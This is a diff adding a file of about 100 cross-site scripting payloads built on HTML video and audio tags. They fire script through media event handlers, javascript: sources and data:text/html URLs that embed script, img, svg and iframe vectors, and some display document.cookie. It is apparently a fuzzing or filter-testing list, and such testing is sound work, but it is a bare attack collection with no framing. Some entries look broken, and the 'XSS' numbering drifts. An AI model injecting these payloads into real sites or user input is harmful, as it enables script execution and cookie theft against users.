@@ -1,0 +1,102 @@
+<video src="javascript:alert(1)"></video>
+<video onerror="alert(2)" src="invalid.mp4"></video>
+<video onplay="alert(3)" src="video.mp4"></video>
+<video onpause="alert(4)"></video>
+<video onended="alert(5)"></video>
+<video onloadeddata="alert(6)"></video>
+<video onloadstart="alert(7)"></video>
+<video onseeked="alert(8)"></video>
+<video onseeking="alert(9)"></video>
+<video onvolumechange="alert(10)"></video>
+<video onwaiting="alert(11)"></video>
+<video oncanplay="alert(12)"></video>
+<video oncanplaythrough="alert(13)"></video>
+<video onstalled="alert(14)"></video>
+<video ontimeupdate="alert(15)"></video>
+<video onloadedmetadata="alert(16)"></video>
+<video onratechange="alert(17)"></video>
+<video onresize="alert(18)"></video>
+<video onabort="alert(19)"></video>
+<video onemptied="alert(20)"></video>
+<video onerror="alert(document.cookie)" src="fail.mp4"></video>
+<video src="data:text/html,<script>alert(22)</script>"></video>
+<video src="data:video/mp4;base64,AAAA...javascript:alert(23)"></video>
+<video oncanplay="alert('XSS24')"></video>
+<video onplay="confirm('XSS25')"></video>
+<video onpause="prompt('XSS26')"></video>
+<video onseeked="console.log('XSS27')"></video>
+<video onvolumechange="alert(navigator.userAgent)"></video>
+<video src="javascript:alert(window.location)"></video>
+<video src="javascript:alert(document.domain)"></video>
+<video src="javascript:alert(String.fromCharCode(88,83,83))"></video>
+<video onerror="alert('XSS31')" src="broken.mp4"></video>
+<video onloadeddata="alert('XSS32')"></video>
+<video onloadstart="alert('XSS33')"></video>
+<video onwaiting="alert('XSS34')"></video>
+<video ontimeupdate="alert('XSS35')"></video>
+<video onabort="alert('XSS36')"></video>
+<video onstalled="alert('XSS37')"></video>
+<video onemptied="alert('XSS38')"></video>
+<video src="data:text/html,<img src=x onerror=alert(39)>"></video>
+<video src="data:text/html,<svg/onload=alert(40)>"></video>
+<video onseeked="alert('XSS41')"></video>
+<video onratechange="alert('XSS42')"></video>
+<video onresize="alert('XSS43')"></video>
+<video oncanplaythrough="alert('XSS44')"></video>
+<video onerror="alert('XSS45')" src="404.mp4"></video>
+<video src="data:text/html,<iframe src=javascript:alert(46)>"></video>
+<video onplay="alert('XSS47')"></video>
+<video onpause="alert('XSS48')"></video>
+<video src="javascript:alert('XSS49')"></video>
+<audio src="javascript:alert(50)"></audio>
+<audio onerror="alert(51)" src="fail.mp3"></audio>
+<audio onplay="alert(52)"></audio>
+<audio onpause="alert(53)"></audio>
+<audio onended="alert(54)"></audio>
+<audio onloadeddata="alert(55)"></audio>
+<audio onloadstart="alert(56)"></audio>
+<audio onseeked="alert(57)"></audio>
+<audio onseeking="alert(58)"></audio>
+<audio onvolumechange="alert(59)"></audio>
+<audio onwaiting="alert(60)"></audio>
+<audio oncanplay="alert(61)"></audio>
+<audio oncanplaythrough="alert(62)"></audio>
+<audio onstalled="alert(63)"></audio>
+<audio ontimeupdate="alert(64)"></audio>
+<audio onloadedmetadata="alert(65)"></audio>
+<audio onratechange="alert(66)"></audio>
+<audio onresize="alert(67)"></audio>
+<audio onabort="alert(68)"></audio>
+<audio onemptied="alert(69)"></audio>
+<audio onerror="alert(document.cookie)" src="fail.mp3"></audio>
+<audio src="data:text/html,<script>alert(71)</script>"></audio>
+<audio src="data:audio/mp3;base64,AAAA...javascript:alert(72)"></audio>
+<audio oncanplay="alert('XSS73')"></audio>
+<audio onplay="confirm('XSS74')"></audio>
+<audio onpause="prompt('XSS75')"></audio>
+<audio onseeked="console.log('XSS76')"></audio>
+<audio onvolumechange="alert(navigator.userAgent)"></audio>
+<audio src="javascript:alert(window.location)"></audio>
+<audio src="javascript:alert(document.domain)"></audio>
+<audio src="javascript:alert(String.fromCharCode(88,83,83))"></audio>
+<audio onerror="alert('XSS80')" src="broken.mp3"></audio>
+<audio onloadeddata="alert('XSS81')"></audio>
+<audio onloadstart="alert('XSS82')"></audio>
+<audio onwaiting="alert('XSS83')"></audio>
+<audio ontimeupdate="alert('XSS84')"></audio>
+<audio onabort="alert('XSS85')"></audio>
+<audio onstalled="alert('XSS86')"></audio>
+<audio onemptied="alert('XSS87')"></audio>
+<audio src="data:text/html,<img src=x onerror=alert(88)>"></audio>
+<audio src="data:text/html,<svg/onload=alert(89)>"></audio>
+<audio onseeked="alert('XSS90')"></audio>
+<audio onratechange="alert('XSS91')"></audio>
+<audio onresize="alert('XSS92')"></audio>
+<audio oncanplaythrough="alert('XSS93')"></audio>
+<audio onerror="alert('XSS94')" src="404.mp3"></audio>
+<audio src="data:text/html,<iframe src=javascript:alert(95)>"></audio>
+<audio onplay="alert('XSS96')"></audio>
+<audio onpause="alert('XSS97')"></audio>
+<audio src="javascript:alert('XSS98')"></audio>
+<audio onvolumechange="alert('XSS99')"></audio>
+<audio onwaiting="alert('XSS100')"></audio>
